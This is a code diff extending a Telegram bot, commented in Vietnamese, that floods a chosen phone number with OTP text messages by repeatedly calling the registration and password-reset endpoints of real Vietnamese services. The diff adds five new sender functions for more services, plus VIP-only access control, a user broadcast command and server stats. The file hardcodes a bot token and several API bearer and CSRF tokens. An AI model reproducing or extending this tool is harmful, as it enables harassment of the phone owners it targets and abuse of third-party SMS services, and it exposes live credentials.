@@ -11,6 +11,10 @@ import telebot
 from telebot.types import Message
 from flask import Flask
 import requests
+try:
+    import psutil
+except ImportError:
+    psutil = None
 
 # CONFIG - ĐIỀU CHỈNH CHO PHÙ HỢP VỚI MÁY TÍNH
 TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8669337116:AAGo6urkWzXSb0vWUWlpVytf2DJiF932pYI')
@@ -25,6 +29,33 @@ MAX_THREADS_PER_TARGET = 50     # Số thread cho mỗi job
 BATCH_SIZE = 20                  # Số lượng gửi trong mỗi batch
 DELAY_BETWEEN_ROUNDS_SEC = (2, 4)  # Delay giữa các vòng
 REQUEST_TIMEOUT = 10             # Timeout cho mỗi request
+
+# ADMIN CONFIG
+ADMIN_IDS = [6630785148]          # THAY ID TELEGRAM CỦA ADMIN VÀO ĐÂY
+VIP_FILE = "vips.txt"
+USERS_FILE = "users.txt"
+VIP_ONLY_MODE = False
+
+# HÀM LOAD/SAVE VIP & USERS
+def load_list(filename):
+    if not os.path.exists(filename):
+        return set()
+    with open(filename, "r") as f:
+        return set(line.strip() for line in f if line.strip())
+
+def save_list(filename, data_set):
+    with open(filename, "w") as f:
+        for item in data_set:
+            f.write(f"{item}\n")
+
+vips_list = load_list(VIP_FILE)
+users_list = load_list(USERS_FILE)
+
+def add_user(user_id):
+    user_id_str = str(user_id)
+    if user_id_str not in users_list:
+        users_list.add(user_id_str)
+        save_list(USERS_FILE, users_list)
 
 # Cache sessions để tái sử dụng
 session_cache = {}
@@ -1252,6 +1283,59 @@ def send_otp_via_tv360m(phone: str):
     except:
         pass
 
+def send_otp_via_vietloan2(phone: str):
+    try:
+        session = get_session()
+        data = {
+            'phone': phone,
+            '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
+        }
+        session.post('https://vietloan.vn/register/phone-resend', data=data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_mutosi1(phone: str):
+    try:
+        session = get_session()
+        json_data = {
+            'phone': phone,
+            'token': '',
+            'source': 'web_consumers',
+        }
+        headers = {
+            'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
+        }
+        session.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_myviettel4(phone: str):
+    try:
+        session = get_session()
+        json_data = {'phone': phone, 'type': ''}
+        headers = {
+            'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i',
+        }
+        session.post('https://viettel.vn/api/get-otp-login', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_pharmacity(phone: str):
+    try:
+        session = get_session()
+        json_data = {'phone': phone, 'referral': ''}
+        session.post('https://api-gateway.pharmacity.vn/customers/register/otp', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_moneyveo(phone: str):
+    try:
+        session = get_session()
+        data = {'phoneNumber': phone}
+        session.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', data=data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
 # DANH SÁCH TẤT CẢ CÁC HÀM GỬI
 ALL_SENDERS = [
     ("sapo", send_otp_via_sapo),
@@ -1361,6 +1445,11 @@ ALL_SENDERS = [
     ("ssi", send_otp_via_ssi),
     ("fptshop2", send_otp_via_fptshop2),
     ("tv360m", send_otp_via_tv360m),
+    ("vietloan2", send_otp_via_vietloan2),
+    ("mutosi1", send_otp_via_mutosi1),
+    ("myviettel4", send_otp_via_myviettel4),
+    ("pharmacity", send_otp_via_pharmacity),
+    ("moneyveo", send_otp_via_moneyveo),
 ]
 
 # CHIA BATCH
@@ -1433,10 +1522,109 @@ def spam_worker(phone: str, total_rounds: int, stop_event: threading.Event):
 # CÁC LỆNH TELEGRAM
 @bot.message_handler(commands=['start', 'help'])
 def cmd_start(message: Message):
-    bot.reply_to(message, "Lệnh:\n/spam <số điện thoại> <số vòng>\n/stop <số điện thoại>\n/stopall\n/status")
+    add_user(message.chat.id)
+    help_text = "Lệnh:\n/spam <số điện thoại> <số vòng>\n/stop <số điện thoại>\n/stopall\n/status"
+    if message.chat.id in ADMIN_IDS:
+        help_text += "\n\n🔑 Lệnh Admin:\n/rolevip : Bật/tắt chế độ VIP\n/addvip <id> : Thêm VIP\n/kickvip <id> : Xoá VIP\n/host : Xem cấu hình host\n/msg <nội_dung> : Gửi TB cho tất cả user"
+    bot.reply_to(message, help_text)
+
+# --- LỆNH ADMIN ---
+@bot.message_handler(commands=['rolevip'])
+def cmd_rolevip(message: Message):
+    global VIP_ONLY_MODE
+    if message.chat.id not in ADMIN_IDS:
+        return
+    VIP_ONLY_MODE = not VIP_ONLY_MODE
+    status = "BẬT 🟢 (Chỉ VIP mới được dùng bot)" if VIP_ONLY_MODE else "TẮT 🔴 (Ai cũng được dùng bot)"
+    bot.reply_to(message, f"Chế độ VIP_ONLY đang: {status}")
+
+@bot.message_handler(commands=['addvip'])
+def cmd_addvip(message: Message):
+    if message.chat.id not in ADMIN_IDS:
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "Sai cú pháp. Dùng: /addvip <id_telegram>")
+        return
+    vip_id = parts[1].strip()
+    vips_list.add(vip_id)
+    save_list(VIP_FILE, vips_list)
+    bot.reply_to(message, f"✅ Đã thêm {vip_id} vào danh sách VIP.")
+
+@bot.message_handler(commands=['kickvip'])
+def cmd_kickvip(message: Message):
+    if message.chat.id not in ADMIN_IDS:
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "Sai cú pháp. Dùng: /kickvip <id_telegram>")
+        return
+    vip_id = parts[1].strip()
+    if vip_id in vips_list:
+        vips_list.remove(vip_id)
+        save_list(VIP_FILE, vips_list)
+        bot.reply_to(message, f"🗑 Đã xoá {vip_id} khỏi danh sách VIP.")
+    else:
+        bot.reply_to(message, f"ID {vip_id} không có trong danh sách VIP.")
+
+@bot.message_handler(commands=['host', 'stats'])
+def cmd_host(message: Message):
+    if message.chat.id not in ADMIN_IDS:
+        return
+    
+    if psutil is None:
+        bot.reply_to(message, "⚠️ Lệnh /host yêu cầu cài đặt thư viện `psutil`.\nHãy chạy lệnh: `pip install psutil` trên máy chủ.")
+        return
+
+    try:
+        cpu = psutil.cpu_percent(interval=1)
+        ram = psutil.virtual_memory()
+        disk = psutil.disk_usage('/')
+        
+        stats = (
+            f"🖥 **Thông số máy chủ:**\n"
+            f"CPU: {cpu}%\n"
+            f"RAM: {ram.percent}% ({ram.used // (1024**2)}MB / {ram.total // (1024**2)}MB)\n"
+            f"DISK: {disk.percent}% ({disk.used // (1024**3)}GB / {disk.total // (1024**3)}GB)"
+        )
+    except Exception as e:
+        stats = f"🖥 **Thông số máy chủ:**\nKhông thể lấy thông tin vì thiếu thư viện. Lỗi: {e}"
+        
+    bot.reply_to(message, stats, parse_mode='Markdown')
+
+@bot.message_handler(commands=['msg'])
+def cmd_msg(message: Message):
+    if message.chat.id not in ADMIN_IDS:
+        return
+    text = message.text.replace('/msg ', '', 1).strip()
+    if not text or text == '/msg':
+        bot.reply_to(message, "Vui lòng nhập nội dung. Cú pháp: /msg Nội dung thông báo")
+        return
+        
+    success = 0
+    fail = 0
+    bot.reply_to(message, f"Bắt đầu gửi thông báo đến {len(users_list)} người dùng...")
+    for uid in users_list:
+        try:
+            bot.send_message(uid, f"📢 **Thông báo từ Admin:**\n\n{text}", parse_mode='Markdown')
+            success += 1
+        except Exception:
+            fail += 1
+    
+    bot.reply_to(message, f"✅ Gửi xong!\nThành công: {success}\nThất bại: {fail}")
+# ------------------
 
 @bot.message_handler(commands=['spam'])
 def cmd_spam(message: Message):
+    add_user(message.chat.id)
+    
+    # Kiểm tra VIP MODE
+    user_id_str = str(message.chat.id)
+    if VIP_ONLY_MODE:
+        if user_id_str not in vips_list and message.chat.id not in ADMIN_IDS:
+            bot.reply_to(message, "⛔️ Bot đang ở chế độ VIP Only. Chỉ tài khoản VIP mới được sử dụng.")
+            return
+
     parts = message.text.split()
     if len(parts) != 3:
         bot.reply_to(message, "Sai cú pháp. Dùng: /spam 0909123456 30")
@@ -1545,10 +1733,24 @@ if __name__ == '__main__':
     print(f"📱 Số lượng API: {len(ALL_SENDERS)}")
     print(f"⚙️  Batch size: {BATCH_SIZE}, Max threads: {MAX_THREADS_PER_TARGET}")
     
+    # Thiết lập menu lệnh cho Bot trên Telegram
+    try:
+        commands = [
+            telebot.types.BotCommand("start", "Bắt đầu và xem hướng dẫn"),
+            telebot.types.BotCommand("spam", "Bắt đầu spam (vd: /spam 09xxx 30)"),
+            telebot.types.BotCommand("stop", "Dừng spam 1 số (vd: /stop 09xxx)"),
+            telebot.types.BotCommand("stopall", "Dừng tất cả các tiến trình spam"),
+            telebot.types.BotCommand("status", "Xem danh sách các số đang spam"),
+        ]
+        bot.set_my_commands(commands)
+        print("✅ Đã cập nhật menu lệnh cho Bot.")
+    except Exception as e:
+        print(f"⚠️ Không thể cài đặt menu lệnh: {e}")
+
     # Chạy polling trong thread riêng
     polling_thread = threading.Thread(target=run_polling, daemon=True)
     polling_thread.start()
     
     # Chạy Flask
-    port = int(os.environ.get('PORT', 5000))
+    port = int(os.environ.get('PORT', 30025))
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
